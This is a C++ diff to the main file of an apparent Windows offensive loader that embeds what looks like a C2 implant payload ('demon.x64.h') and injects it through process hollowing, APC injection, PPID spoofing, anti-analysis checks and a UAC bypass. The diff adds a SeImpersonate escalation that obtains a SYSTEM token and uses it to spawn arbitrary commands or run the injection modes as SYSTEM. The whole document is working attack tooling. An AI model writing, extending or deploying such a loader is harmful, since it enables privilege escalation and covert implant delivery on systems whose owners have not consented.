@@ -3,12 +3,14 @@
 #include <string>
 #include <cstring>
 #include <windows.h>
+#include <userenv.h>
 #include "easCipher42.hpp"
 #include "crypto_funcs.hpp"
 #include "process_hollower.hpp"
 #include "process_injection.hpp"
 #include "bypass_analysis.hpp"
 #include "uac_bypass.hpp"
+#include "seimpersonate.hpp"
 #include "demon.x64.h"
 
 enum class InjectionMode { DEFAULT, HOLLOW, APC, UAC };
@@ -16,6 +18,7 @@ enum class InjectionMode { DEFAULT, HOLLOW, APC, UAC };
 struct Config {
     bool verbose = false;
     bool anti_analysis = false;
+    bool use_impersonate = false;  // SeImpersonate escalation to SYSTEM
     InjectionMode mode = InjectionMode::DEFAULT;
     DWORD target_pid = 0;
     DWORD spoof_ppid = 0;
@@ -35,6 +38,7 @@ void print_usage(const char* prog) {
     std::cout << "OPTIONS:\n";
     std::cout << "  -v, --verbose       Enable verbose debug output\n";
     std::cout << "  -a, --anti          Run anti-analysis checks\n";
+    std::cout << "  -i, --impersonate   Escalate to SYSTEM via SeImpersonate\n";
     std::cout << "  -f, --file PATH     Target process to hollow (default: svchost.exe)\n";
     std::cout << "  -p, --pid PID       PID for APC injection (required for -m apc)\n";
     std::cout << "  --ppid PPID         Parent PID spoofing (works with hollow/apc spawn)\n";
@@ -141,6 +145,9 @@ Config parse_args(int argc, char* argv[]) {
                 exit(1);
             }
         }
+        else if (arg == "-i" || arg == "--impersonate") {
+            cfg.use_impersonate = true;
+        }
         else if (arg == "-h" || arg == "--help") {
             print_usage(argv[0]);
             exit(0);
@@ -230,11 +237,81 @@ int main(int argc, char* argv[]) {
         std::cout << "[+] Header: " << bytes_to_hex(payload.data(), 16) << "\n\n";
     }
 
+    // Special case: -i -c "command" (escalate and spawn command as SYSTEM)
+    if (cfg.use_impersonate && !cfg.custom_command.empty() && cfg.mode == InjectionMode::DEFAULT) {
+        std::cout << "[*] SeImpersonate with custom command spawn...\n";
+
+        SeImpersonateHandler impersonator(cfg.verbose);
+        HANDLE system_token = INVALID_HANDLE_VALUE;
+
+        if (!impersonator.Execute(system_token)) {
+            std::cout << "[-] Escalation FAILED\n";
+            return -1;
+        }
+
+        std::cout << "[+] Escalation successful! Got SYSTEM token\n";
+        std::cout << "[*] Spawning custom command as SYSTEM: " << cfg.custom_command << "\n";
+
+        // Convert command to wide string
+        int cmd_size = MultiByteToWideChar(CP_ACP, 0, cfg.custom_command.c_str(), -1, nullptr, 0);
+        std::wstring cmd_wide(cmd_size, 0);
+        MultiByteToWideChar(CP_ACP, 0, cfg.custom_command.c_str(), -1, &cmd_wide[0], cmd_size);
+
+        STARTUPINFOW si = {};
+        PROCESS_INFORMATION pi = {};
+        si.cb = sizeof(STARTUPINFOW);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_SHOW;
+
+        // Use CreateProcessWithTokenW to spawn in correct session
+        BOOL result = CreateProcessWithTokenW(
+            system_token,
+            LOGON_WITH_PROFILE,
+            nullptr,
+            &cmd_wide[0],
+            0,
+            nullptr,
+            nullptr,
+            &si,
+            &pi
+        );
+
+        if (!result) {
+            std::cout << "[-] CreateProcessWithTokenW failed: " << GetLastError() << "\n";
+            CloseHandle(system_token);
+            return -1;
+        }
+
+        std::cout << "[+] SUCCESS - Command spawned as SYSTEM (PID: " << pi.dwProcessId << ")\n";
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        CloseHandle(system_token);
+        return 0;
+    }
+
     // 5. Execute injection method based on mode
     if (cfg.mode == InjectionMode::HOLLOW) {
         std::cout << "[*] Hollowing mode (target: " << cfg.target_process << ")...\n";
         if (cfg.spoof_ppid != 0) {
             std::cout << "[*] PPID spoofing enabled (target: " << cfg.spoof_ppid << ")...\n";
+        }
+        if (cfg.use_impersonate) {
+            std::cout << "[*] With SeImpersonate escalation...\n";
+        }
+
+        HANDLE system_token = INVALID_HANDLE_VALUE;
+        if (cfg.use_impersonate) {
+            SeImpersonateHandler impersonator(cfg.verbose);
+            if (!impersonator.Execute(system_token)) {
+                std::cout << "[-] Escalation FAILED\n";
+                return -1;
+            }
+            std::cout << "[+] Escalation successful! Got SYSTEM token\n";
+            if (!ImpersonateLoggedOnUser(system_token)) {
+                std::cout << "[-] ImpersonateLoggedOnUser failed: " << GetLastError() << "\n";
+                CloseHandle(system_token);
+                return -1;
+            }
         }
 
         int wide_size = MultiByteToWideChar(CP_ACP, 0, cfg.target_process.c_str(), -1, nullptr, 0);
@@ -242,7 +319,14 @@ int main(int argc, char* argv[]) {
         MultiByteToWideChar(CP_ACP, 0, cfg.target_process.c_str(), -1, &target_wide[0], wide_size);
 
         ProcessHollower hollower(cfg.verbose, cfg.spoof_ppid);
-        if (hollower.HollowProcess(target_wide.c_str(), payload)) {
+        BOOL result = hollower.HollowProcess(target_wide.c_str(), payload);
+
+        if (cfg.use_impersonate) {
+            RevertToSelf();
+            CloseHandle(system_token);
+        }
+
+        if (result) {
             std::cout << "[+] SUCCESS\n";
             return 0;
         } else {
@@ -251,15 +335,41 @@ int main(int argc, char* argv[]) {
         }
     }
     else if (cfg.mode == InjectionMode::APC) {
-        std::cout << "[*] APC injection mode (PID " << cfg.target_pid << ")...\n";
-
-        ProcessInjection injector(cfg.verbose);
-        if (injector.InjectViaAPC(cfg.target_pid, payload)) {
-            std::cout << "[+] SUCCESS\n";
-            return 0;
+        if (cfg.use_impersonate) {
+            std::cout << "[*] APC injection mode with SeImpersonate escalation (PID " << cfg.target_pid << ")...\n";
+            SeImpersonateHandler impersonator(cfg.verbose);
+            HANDLE system_token = INVALID_HANDLE_VALUE;
+            if (!impersonator.Execute(system_token)) {
+                std::cout << "[-] Escalation FAILED\n";
+                return -1;
+            }
+            std::cout << "[+] Escalation successful! Got SYSTEM token\n";
+            if (!ImpersonateLoggedOnUser(system_token)) {
+                std::cout << "[-] ImpersonateLoggedOnUser failed: " << GetLastError() << "\n";
+                CloseHandle(system_token);
+                return -1;
+            }
+            ProcessInjection injector(cfg.verbose);
+            BOOL injectionSuccess = injector.InjectViaAPC(cfg.target_pid, payload);
+            RevertToSelf();
+            CloseHandle(system_token);
+            if (injectionSuccess) {
+                std::cout << "[+] SUCCESS\n";
+                return 0;
+            } else {
+                std::cout << "[-] FAILED\n";
+                return -1;
+            }
         } else {
-            std::cout << "[-] FAILED\n";
-            return -1;
+            std::cout << "[*] APC injection mode (PID " << cfg.target_pid << ")...\n";
+            ProcessInjection injector(cfg.verbose);
+            if (injector.InjectViaAPC(cfg.target_pid, payload)) {
+                std::cout << "[+] SUCCESS\n";
+                return 0;
+            } else {
+                std::cout << "[-] FAILED\n";
+                return -1;
+            }
         }
     }
     else if (cfg.mode == InjectionMode::UAC) {
@@ -308,6 +418,25 @@ int main(int argc, char* argv[]) {
         if (cfg.spoof_ppid != 0) {
             std::cout << "[*] PPID spoofing enabled (target: " << cfg.spoof_ppid << ")...\n";
         }
+        if (cfg.use_impersonate) {
+            std::cout << "[*] With SeImpersonate escalation...\n";
+        }
+
+        // Escalate to SYSTEM if requested
+        HANDLE system_token = INVALID_HANDLE_VALUE;
+        if (cfg.use_impersonate) {
+            SeImpersonateHandler impersonator(cfg.verbose);
+            if (!impersonator.Execute(system_token)) {
+                std::cout << "[-] Escalation FAILED\n";
+                return -1;
+            }
+            std::cout << "[+] Escalation successful! Got SYSTEM token\n";
+            if (!ImpersonateLoggedOnUser(system_token)) {
+                std::cout << "[-] ImpersonateLoggedOnUser failed: " << GetLastError() << "\n";
+                CloseHandle(system_token);
+                return -1;
+            }
+        }
 
         // Convert target process to wide string
         int wide_size = MultiByteToWideChar(CP_ACP, 0, cfg.target_process.c_str(), -1, nullptr, 0);
@@ -328,6 +457,7 @@ int main(int argc, char* argv[]) {
                 DWORD err = GetLastError();
                 if (err != ERROR_INSUFFICIENT_BUFFER) {
                     std::cout << "[-] InitializeProcThreadAttributeList failed: " << err << "\n";
+                    if (cfg.use_impersonate) { RevertToSelf(); CloseHandle(system_token); }
                     return -1;
                 }
             }
@@ -335,20 +465,23 @@ int main(int argc, char* argv[]) {
             lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
             if (!lpAttributeList) {
                 std::cout << "[-] HeapAlloc failed\n";
+                if (cfg.use_impersonate) { RevertToSelf(); CloseHandle(system_token); }
                 return -1;
             }
 
             if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &attr_size)) {
                 std::cout << "[-] InitializeProcThreadAttributeList init failed\n";
                 HeapFree(GetProcessHeap(), 0, lpAttributeList);
+                if (cfg.use_impersonate) { RevertToSelf(); CloseHandle(system_token); }
                 return -1;
             }
 
-            hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, cfg.spoof_ppid);
+            hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, cfg.spoof_ppid);
             if (!hParentProcess) {
                 std::cout << "[-] OpenProcess (PPID " << cfg.spoof_ppid << ") failed: " << GetLastError() << "\n";
                 DeleteProcThreadAttributeList(lpAttributeList);
                 HeapFree(GetProcessHeap(), 0, lpAttributeList);
+                if (cfg.use_impersonate) { RevertToSelf(); CloseHandle(system_token); }
                 return -1;
             }
 
@@ -358,6 +491,7 @@ int main(int argc, char* argv[]) {
                 CloseHandle(hParentProcess);
                 DeleteProcThreadAttributeList(lpAttributeList);
                 HeapFree(GetProcessHeap(), 0, lpAttributeList);
+                if (cfg.use_impersonate) { RevertToSelf(); CloseHandle(system_token); }
                 return -1;
             }
 
@@ -375,6 +509,7 @@ int main(int argc, char* argv[]) {
 
             if (!result) {
                 std::cout << "[-] CreateProcessW failed: " << GetLastError() << "\n";
+                if (cfg.use_impersonate) { RevertToSelf(); CloseHandle(system_token); }
                 return -1;
             }
         } else {
@@ -392,7 +527,15 @@ int main(int argc, char* argv[]) {
 
         // APC inject into spawned process
         ProcessInjection injector(cfg.verbose);
-        if (injector.InjectViaAPC(pi.dwProcessId, payload)) {
+        BOOL injectionSuccess = injector.InjectViaAPC(pi.dwProcessId, payload);
+
+        // Revert impersonation if used
+        if (cfg.use_impersonate) {
+            RevertToSelf();
+            CloseHandle(system_token);
+        }
+
+        if (injectionSuccess) {
             std::cout << "[+] SUCCESS\n";
             CloseHandle(pi.hProcess);
             return 0;
